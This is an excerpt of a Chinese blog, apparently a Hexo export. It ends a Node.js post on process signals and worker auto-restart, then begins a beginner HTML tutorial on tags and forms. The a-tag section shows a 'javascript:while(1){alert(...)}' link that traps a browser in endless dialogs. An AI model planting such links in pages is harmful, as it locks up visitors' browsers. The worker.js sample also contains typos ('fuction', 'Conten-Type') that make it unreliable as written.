<p>Node提供了这些信号对应的信号事件，每个进程都可以监听这些信号事件。这些信号事件是用来通知进程的，每个信号事件有不同的含义，进程在收到响应信号时，应当做出约定的行为，如SIGTERM是软件终止信号，进程收到该信号时应当退出</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">process.on(<span class="string">'SIGTERM'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Got a SIGTERM, exiting...'</span>);</span><br><span class="line">  process.exit(<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'server running with PID:'</span>, process.pid);</span><br><span class="line">process.kill(process.pid, <span class="string">'SIGTERM'</span>);</span><br></pre></td></tr></table></figure>
<h2 id="自动重启"><a href="#自动重启" class="headerlink" title="自动重启"></a>自动重启</h2><p>有了父子进程之间的相关事件之后，就可以在这些关系之间创建出需要的机制了。</p>
<p>至少我们能够通过监听子进程的exit事件来获知其退出的信息，接着前文的多进程架构，我们主进程上加入一些进程管理的机制，比如某个工作进程退出了，重新启动一个工作进程来继续服务。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// master.js</span></span><br><span class="line"><span class="keyword">var</span> fork = <span class="built_in">require</span>(<span class="string">'child_process'</span>).fork;</span><br><span class="line"><span class="keyword">var</span> cpus = <span class="built_in">require</span>(<span class="string">'os'</span>).cpus();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = <span class="built_in">require</span>(<span class="string">'net'</span>).createServer();</span><br><span class="line">server.listen(<span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> workers = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> createWorker = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> worker = fork(__dirname + <span class="string">'/worker.js'</span>)</span><br><span class="line">  <span class="comment">// 退出时重新启动新的进程</span></span><br><span class="line">  worker.on(<span class="string">'exit'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Worker '</span> + worker.pid + <span class="string">' exited.'</span>);</span><br><span class="line">    <span class="keyword">delete</span> workers[worker.pid];</span><br><span class="line">    createWorker();</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// 句柄转发</span></span><br><span class="line">  worker.send(<span class="string">'server'</span>, server);</span><br><span class="line">  workers[worker.pid] = worker;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Create worker. pid: '</span> + worker.pid);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cpus.length; i ++) &#123;</span><br><span class="line">  createWorker();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进程自己退出时，让所有工作进程退出</span></span><br><span class="line">process.on(<span class="string">'exit'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> pid <span class="keyword">in</span> workers) &#123;</span><br><span class="line">    workers[pid].kill();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>我们可以通过kill [pid]命令对以上代码进行测试。</p>
<p>其实，实际业务中更可能是存在bug导致工作进程退出，我们需要仔细处理这种异常：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// worker.js</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.writeHead(<span class="number">200</span>, &#123;<span class="string">"Conten-Type"</span>: <span class="string">"text/plain"</span>&#125;);</span><br><span class="line">  res.end(<span class="string">'handle by child, pid is '</span> + process.pid + <span class="string">'\n'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> worker;</span><br><span class="line">process.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">m, tcp</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (m === <span class="string">'server'</span>) &#123;</span><br><span class="line">    worker = tcp;</span><br><span class="line">    worker.on(<span class="string">'connection'</span>, fuction(socket) &#123;</span><br><span class="line">      server.emit(<span class="string">"connection"</span>, socket)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">process.on(<span class="string">'uncaughtException'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 停止接收新的连接</span></span><br><span class="line">  worker.close(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 所有已有连接断开后，退出进程</span></span><br><span class="line">    process.exit(<span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>上述代码的处理流程是，一旦有未捕获的异常出现，工作进程会立即停止接收新的连接；当所有连接断开后，退出进程。主进程在侦听到工作进程的exit后，将会立即启动新的进程服务，以保证整个集群中总有进程在为用户服务。</p>
<h3 id="自杀信号"><a href="#自杀信号" class="headerlink" title="自杀信号"></a>自杀信号</h3>]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title>web前端入门到实战</title>
    <url>/2020/08/02/web%E5%89%8D%E7%AB%AF%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>web前端入门到实战<br><a id="more"></a></p>
<h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><p>“web前端入门到实战”是为后端、数据工程师量身定制的前端学习教程。通过本教程的学习，小伙伴们可以系统掌握一套web前端开发体系，满足日常开发需要，并且具备系统地分析和解决问题的能力。</p>
<p>学习会分为两个阶段进行：</p>
<ol>
<li>系统学习（约占总学习时间的75%）</li>
<li>项目讲解</li>
</ol>
<p>重点在系统学习，掌握整个体系后小伙伴们完全可以自主去理解项目。</p>
<h2 id="系统学习路线"><a href="#系统学习路线" class="headerlink" title="系统学习路线"></a>系统学习路线</h2><p><img src="https://wx-file-cloud.oss-cn-beijing.aliyuncs.com/wxf01df371f2b60c54o6zAJs7ejCiwjEXNebUTC6k68ZOAm6k3jgIZ57Ede4146a94e0db1b0f411ae6b6dde8a409-003405073907257106-20200803095708776.png" width="400" height="400" alt="系统学习路线"></p>
<p>每章学习时间跨度为1~3周，皆为周末自学。部分需要讲解的章节计划录制视频方便小伙伴们在家学习。</p>
<p>阶段一（2~3个月，重中之重，踏实学完即可快速上手项目开发）</p>
<ol>
<li>html</li>
<li>css</li>
<li>作业：有赞官网首页首屏静态页面</li>
<li>js(es5)</li>
<li>react</li>
<li>redux</li>
</ol>
<p>阶段二（web前端技术栈必要知识补充）</p>
<ol>
<li>dom</li>
<li>bom</li>
<li>html5</li>
<li>css3</li>
<li>es6</li>
<li>webpack</li>
</ol>
<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><ol>
<li><a href="https://code.visualstudio.com/" target="_blank" rel="noopener">VS Code</a>，代码编辑器</li>
<li><a href="https://github.com/nvm-sh/nvm" target="_blank" rel="noopener">nvm</a>(Node Version Manager，可以自由切换node.js版本)，安装完毕后再用nvm安装node.js v12.16.2。</li>
<li>Chrome浏览器</li>
</ol>
<h1 id="html"><a href="#html" class="headerlink" title="html"></a>html</h1><h2 id="初识html"><a href="#初识html" class="headerlink" title="初识html"></a>初识html</h2><p>html全称Hypertext Markup Language，超文本标记语言，网页中所有的文字图片和组织结构都是由html来编写的，当然html能够完成的工作不止这些。</p>
<p>html不是一种编程语言，它不像c/c++/java等编程语言那样拥有变量、函数等，它仅仅由标签组成，如<code>&lt;div&gt;&lt;/div&gt;</code>。</p>
<p>html这个标签是根标签，其他的标签都要放在这个标签里面编写，次一级的两个结构是head标签和body标签<code>&lt;head&gt;&lt;/head&gt;</code>,<code>&lt;body&gt;&lt;/body&gt;</code>。head主要是给浏览器看的，body是页面的主体部分，我们展示出来的内容一般都放在body标签中。</p>
<p>下面让我们来看一个基础的html，打开VS Code编辑器，创建一个test.html文件，内容如下：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  测试</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>打开浏览器就可以看到”测试”两字了。</p>
<p>其中:</p>
<p>doctype是文档类型，有混杂模式和标准模式两大类，不同的模式主要会影响CSS内容的呈现，一般使用HTML5标准模式。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br></pre></td></tr></table></figure></p>
<p>lang属性是来告诉搜索引擎爬虫我们网站是使用什么语言的，例如<code>&lt;html lang=&quot;zh&quot;&gt;</code>表示中文，<code>&lt;html lang=&quot;en&quot;&gt;</code>表示英文。</p>
<p><code>&lt;meta&gt;</code>标签可以设置编码格式的，这个标签不需要写闭合标签。编码集主要有gb2312、gbk、unicode、utf-8等等，一般使用utf-8。</p>
<p><code>&lt;title&gt;</code>标签表示页面标题，每一个网页都有自己的名字，这个名字就是通过<code>&lt;title&gt;</code>标签设置的。</p>
<h2 id="html中的标签"><a href="#html中的标签" class="headerlink" title="html中的标签"></a>html中的标签</h2><p>html中的标签主要分为两大类：</p>
<p>1.行级(或叫内联、行内)元素(标签)，display: inline;<br>这一类元素(标签)的特点是：</p>
<ol>
<li>不占满整行，元素所占空间完全由内容决定</li>
<li>不可以改变宽高</li>
</ol>
<p>如：a em span strong</p>
<p>2.块级元素(标签)，display: block;<br>这一类元素的特点是：</p>
<ol>
<li>占满整行，无论内容多少 </li>
<li>可以改变宽高</li>
</ol>
<p>如：address div form h1-h6 p ul ol li</p>
<p>还有一类标签，既不属于行级元素也不属于块级元素，它们既不独占一行，又可以随意改变宽高，如<code>img</code>、<code>select</code>。</p>
<p>html的标签数量是很多的，并且在不断增加。这么多标签我们不必都记住，接下介绍一些HTML4中常见的标签，HTML5会在后面章节介绍。</p>
<h3 id="p标签（块级）"><a href="#p标签（块级）" class="headerlink" title="p标签（块级）"></a>p标签（块级）</h3><p><code>&lt;p&gt;&lt;/p&gt;</code>是段落标签，在<code>&lt;p&gt;&lt;/p&gt;</code>中写的内容会当做一个段落来处理。它的特点是独占一行，并且段落上下有一定间距。</p>
<h3 id="标题标签h1-h6（块级）"><a href="#标题标签h1-h6（块级）" class="headerlink" title="标题标签h1-h6（块级）"></a>标题标签h1-h6（块级）</h3><p>标题标签的作用是着重显示文字，一般用于标题，它会将文字加粗放大并且独占一行。其中h4的默认大小是正常的文字大小，不过是加粗的。</p>
<h3 id="strong标签（行级）"><a href="#strong标签（行级）" class="headerlink" title="strong标签（行级）"></a>strong标签（行级）</h3><p><code>&lt;strong&gt;&lt;/strong&gt;</code>标签的作用是将里面的文字加粗处理。</p>
<h3 id="em标签（行级）"><a href="#em标签（行级）" class="headerlink" title="em标签（行级）"></a>em标签（行级）</h3><p><code>&lt;em&gt;&lt;/em&gt;</code>的作用是将里面的文字变成斜体。</p>
<h3 id="del标签（行级）"><a href="#del标签（行级）" class="headerlink" title="del标签（行级）"></a>del标签（行级）</h3><p><code>&lt;del&gt;&lt;/del&gt;</code>是删除标签，它会在里面的文字的中间画一条横线。</p>
<h3 id="address-标签（块级）"><a href="#address-标签（块级）" class="headerlink" title="address 标签（块级）"></a>address 标签（块级）</h3><p><code>&lt;address&gt;&lt;/address&gt;</code>是地址标签，它会将里面的内容变成斜体并且独占一行。</p>
<h3 id="div、span"><a href="#div、span" class="headerlink" title="div、span"></a>div、span</h3><p>上面都是很基础的标签，作用也是显而易见。还有一种结构化标签，它们没有特殊的效果，而是用来当容器包裹其他标签的。</p>
<p>结构化标签的一个作用就是用来为里面的子元素设置样式。一般的元素如果某条属性没有被开发者设置样式的话，它会自动继承父级元素的相应属性的样式。</p>
<p>比如我们想让三个p标签里面的文字都变成红色，给三个p标签都写上color:red是非常麻烦的，最简单的方法是将三个p标签放到一个结构化标签里面，再给这个结构化标签设置color:red的样式，里面的三个p标签就都会有这个样式了。</p>
<p>我们在写一个页面之前，最先考虑的就是结构问题，因此一般先写结构化标签。</p>
<p>下面我们介绍最常见的两个结构化标签。</p>
<p>1.div</p>
<p><code>&lt;div&gt;&lt;/div&gt;</code>标签是前端开发中很常见的容器标签。</p>
<p>2.span</p>
<p><code>&lt;span&gt;&lt;/span&gt;</code>标签也是常见的容器标签，多数情况下盛放文字或者icon之类的内容。</p>
<h3 id="ol、li-（ol、li都是块级）"><a href="#ol、li-（ol、li都是块级）" class="headerlink" title="ol、li （ol、li都是块级）"></a>ol、li （ol、li都是块级）</h3><p><code>&lt;ol&gt;&lt;li&gt;&lt;/li&gt;&lt;/ol&gt;</code>是一组标签，它们二者都是成对出现的，单独出现没有意义。</p>
<p>这组标签叫作有序列表，ol是外面的列表框，li是里面的子项，并且每一个li子项的前面都会带有序号。</p>
<p>ol可以设置一些属性：</p>
<ol>
<li><p>type，这个属性的作用是用来设置每一个子项前面显示的内容的。默认情况下是按照数字来排序的，如果我们改成type=”a”，前面序号就会按照小写字母来排序。type的属性值还可以设置成A(按照大写字母来排序)、i(罗马数字、小写）、I(罗马数字、大写)来排序。此外，设置成其它值都是错误的，错误的情况下ol会按照默认的数字来排序。</p>
</li>
<li><p>reversed，设置为reversed=”reversed”的时候，子项的序号会变成倒序排列。</p>
</li>
<li><p>start，这个属性的意思是设置子项从第几个序号开始显示，当我们写start=”2”的时候，序号就会变成2、3、4，而不是默认的1、2、3，字母也是同样的道理。</p>
</li>
</ol>
<p>然而，我们实际上很少在网页中看到文字前面有这些数字、字母序号，所以我们一般不使用ol、li，而是使用ul、li标签。</p>
<h3 id="ul、li（ul、li都是块级）"><a href="#ul、li（ul、li都是块级）" class="headerlink" title="ul、li（ul、li都是块级）"></a>ul、li（ul、li都是块级）</h3><p><code>&lt;ul&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;</code>这一组标签是无序列表，前面的序号会变成点（• ）。</p>
<p>ul同样有一个type属性，这个属性的值设置的是每一个子项前面显示的符号的形式，默认的值是disc(圆点)，当值是square的时候，前面显示的就是方块，值是circle的时候显示的是空心圆圈。</p>
<p>同样的道理，我们也很少在网页中看到文字前面带圆点、方块之类的，所以我们在使用ul、li标签的时候，都会把ul的默认样式list-style改成none，这已经属于css的部分了。</p>
<p>无序列表一般用作导航栏之类，里面的结构样式都一样的部分。</p>
<h3 id="a-行级元素"><a href="#a-行级元素" class="headerlink" title="a(行级元素)"></a>a(行级元素)</h3><p><code>&lt;a&gt;&lt;/a&gt;</code>标签是一个非常重要的标签，它有一个必填的属性叫做href（hyperText reference，超文本链接）。</p>
<p>a标签的主要作用有两点：</p>
<ol>
<li><p>定点跳转我们指定的id的元素位置。这个用法需要我们在href中写上id的值,如<code>&lt;a href=&quot;#test&quot;&gt;点击我跳转&lt;/a&gt;</code>，这样点击a标签后页面就会定位到id=test的元素的位置</p>
</li>
<li><p>超链接。我们设置href的值为本地或者网上的链接，如<a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a> ，点击a标签就会跳转到这个网页。</p>
</li>
<li><p>协议限定符。在href中我们可以写javascript代码，如href=”javascript:while(1){alert(“你中毒了”)}”，点击这个a标签后浏览器会不断弹出对话框。还有发送邮件：<code>&lt;a href=&quot;mailto:rebell0003@gmail.com&quot;&gt;rebell0003@gmail.com&lt;/a&gt;</code>，拨打电话：<code>&lt;a href=&quot;tel:13266419102&quot;&gt;13266419102&lt;/a&gt;</code>。</p>
</li>
</ol>
<p>a标签默认是蓝色字体且带有下划线，我们一般会用css将a标签的默认样式覆盖掉。</p>
<h3 id="img-行级块元素"><a href="#img-行级块元素" class="headerlink" title="img(行级块元素)"></a>img(行级块元素)</h3><p><code>&lt;img&gt;&lt;/img&gt;</code>标签是image图片的意思，它有一个必须的属性叫做src，src属性的值是我们图片的地址，可以是绝对地址也可以是相对地址。</p>
<p>图片标签还有两个属性。</p>
<ol>
<li><p>alt属性。这个属性为其设置图片占位符，当图片因为网速或者链接错误等原因加载不出来的时候，会显示alt设置的值。</p>
</li>
<li><p>title属性。图片提示符，当我们鼠标移入图片的时候，在鼠标旁边会显示这个title属性设置的值。</p>
</li>
</ol>
<h3 id="table、tr、td标签（table是块级，tr、td是行级元素）"><a href="#table、tr、td标签（table是块级，tr、td是行级元素）" class="headerlink" title="table、tr、td标签（table是块级，tr、td是行级元素）"></a>table、tr、td标签（table是块级，tr、td是行级元素）</h3><p><code>&lt;table&gt;&lt;/table&gt;</code>需要搭配<code>&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;</code>一起使用。</p>
<p>table是表格的意思，tr是表格的行，td是表格的数据单元，我们可以理解为列。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>table标签的大概结构是这个样子的，还有几个属性。</p>
<ol>
<li>cellpadding 内边距属性，可以为每一个单元格设置内边距，如cellpadding=”10px”（在table上设）</li>
<li>cellspacing 设置单元之间的空间，当我们设置为0时就可以去掉边线了。（在table上设）</li>
<li>colspan属性，设置一个td占几个单位，默认的一个td占一个单位，可以实现合并单元格的效果。(在td上加，值为数字）</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span>&gt;</span>1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span>&gt;</span>2<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"2"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"2"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>以前可以用这个标签给页面布局，现在我们不这么用了，而是使用div + css给页面布局。</p>
<p>原因是：</p>
<p>使用嵌套表格的方法来布局网页框架会使网页浏览的速度变慢，因为table中的内容是自适应的，为了自适应，它要计算嵌套最深的节点以满足自适应，所以有可能会有一断时间出现空白才显示。 </p>
<p>使用div + css的方法布局网页框架的优点在于制作出来的页面速度较快，且内容和样式分离，便于维护扩展。缺点是相比table方式要复杂些。现在网页都倾向于使用div + css来布局了。</p>
<h3 id="表单（form，块级元素）"><a href="#表单（form，块级元素）" class="headerlink" title="表单（form，块级元素）"></a>表单（form，块级元素）</h3><p>这个元素可以让我们实现前端和后台的数据交互。</p>
<p>表单都是成组出现的，里面有各种各样的元素。</p>
<p>我们先介绍一下form表单元素拥有的属性：</p>
<ol>
<li>action属性 填写服务器地址，这个属性的意思是我们把数据发送到哪个服务器地址</li>
<li>method属性 传输方法，最常见的是POST/GET</li>
</ol>
<p>我们再介绍一下表单拥有的子元素：</p>
<h3 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h3><p>这个标签是一个单标签，不需要闭合。这个标签有一个type属性，这个属性的值决定了这个input标签的类型是什么。</p>
<ol>
<li>text 输入框，我们可以输入文字信息。</li>
<li>password 密码框，输入的文字信息都会以···形式展示。</li>
<li>submit 如果type=”submit”，这个input标签就是一个提交按钮，我们点击这个提交按钮就会将整个表单数据发送到后台服务器。</li>
</ol>
<p>我们发送数据一定要有数据名(key)和数据内容(value)，数据内容就是我们给input标签设置(或输入)的value属性的值，而数据名就需要我们在input标签里面写一个name属性来表示我们这个数据的名字是什么。</p>
<p>这里我们写一个简单的表单：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"https://www.baidu.com/"</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>当我们随便输入一个用户名和密码，点击提交按钮之后，浏览器显示的内容是这样的：</p>
<p><a href="https://www.baidu.com/?username=test&amp;password=test" target="_blank" rel="noopener">https://www.baidu.com/?username=test&amp;password=test</a> </p>
<p>网页地址后面出现了我们所传递的数据<code>?username=test&amp;password=test</code>。</p>
<p>input还有其他的数据形式：</p>
<ol>
<li>type=”radio”</li>
<li>type=”checkbox”</li>
</ol>
<p>radio是单选框的意思，当我们给一个input设置radio的type之后，它就会变成一个圆点。我们可以选择这个圆点，但是我们写很多单选框的时候，它们似乎都能被选中，并没有单选的作用，这是因为我们还没有为这一组单选框设置名字。当我们给几个radio都设置了同一个name的时候，它们就会变成只能选择一个的单选框了。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"https://www.baidu.com/"</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"male"</span> <span class="attr">checked</span>&gt;</span>Male</span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"female"</span>&gt;</span>Female</span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>checkbox是复选框的意思，我们可以同时选择很多个选项。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"https://www.baidu.com/"</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"vehicle"</span> <span class="attr">value</span>=<span class="string">"Bike"</span>&gt;</span>I have a bike</span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"vehicle"</span> <span class="attr">value</span>=<span class="string">"Car"</span> <span class="attr">checked</span>&gt;</span>I have a car </span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><a href="https://www.baidu.com/?vehicle=Bike&amp;vehicle=Car" target="_blank" rel="noopener">https://www.baidu.com/?vehicle=Bike&amp;vehicle=Car</a></p>
<p>可以看到，我们可以使用checked属性为这两个选择框设置默认选中值。</p>
<h3 id="select标签-行级块元素"><a href="#select标签-行级块元素" class="headerlink" title="select标签(行级块元素)"></a>select标签(行级块元素)</h3><p>select标签是选择列表<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"https://www.baidu.com/"</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"province"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>山东<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>黑龙江<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>下拉列表的name属性是写在<code>&lt;select&gt;</code>标签上的，option中间填写的内容就是默认的数据值，但是如果我们给每一个option都加一个value属性的话，那么option中间填写的内容则不作为数据值传递，value的值作为传递的数据值。</p>
<p>下拉列表默认选中的是第一个选项，如果我们可以添加属性selected=”selected”设置它的默认值。</p>
<h2 id="文字分隔符与编码集"><a href="#文字分隔符与编码集" class="headerlink" title="文字分隔符与编码集"></a>文字分隔符与编码集</h2><p>我们在body标签里加个div，为它设置样式，并在中间加一些文字。</p>
<p><code>&lt;div style=&quot;width: 50px; height:50px; background-color: red&quot;&gt;测试测试&lt;/div&gt;</code></p>
<p>我们发现文字会在这个div标签的边界处自动换行，也就是说这个div标签圈定了一个范围，里面的文字或者其他标签都默认在这个范围里面显示。</p>
<p>但是当我们在中间书写的不是中文而是一串英文字符，如<code>aaaaaaaaaaaa</code>的时候，我们会发现这一串英文字符在div的边界处并没有换行，这是为什么呢？</p>
<p>原因是我们的每一个汉字，计算机都会认出来这是一个单独的词，每一个汉字都会默认地和其他汉字分隔开，但是英文字母却不会默认地分隔开，因为计算机不知道多少个英文字母才算是一个词，因此我们需要手动为其添加分隔符。</p>
<p>这个分隔符我们也不陌生，就是空格，只要我们在这一串字符中间加几个空格，那么被空格隔开的字符就会被当做是一个词而与其他词分隔开。</p>
<p>那么现在问题来了，既然空格的作用是当做分隔符来使用，并不是我们所想的那种”空白的一个格”，那么我们怎么在html中写真正的空白格呢？</p>
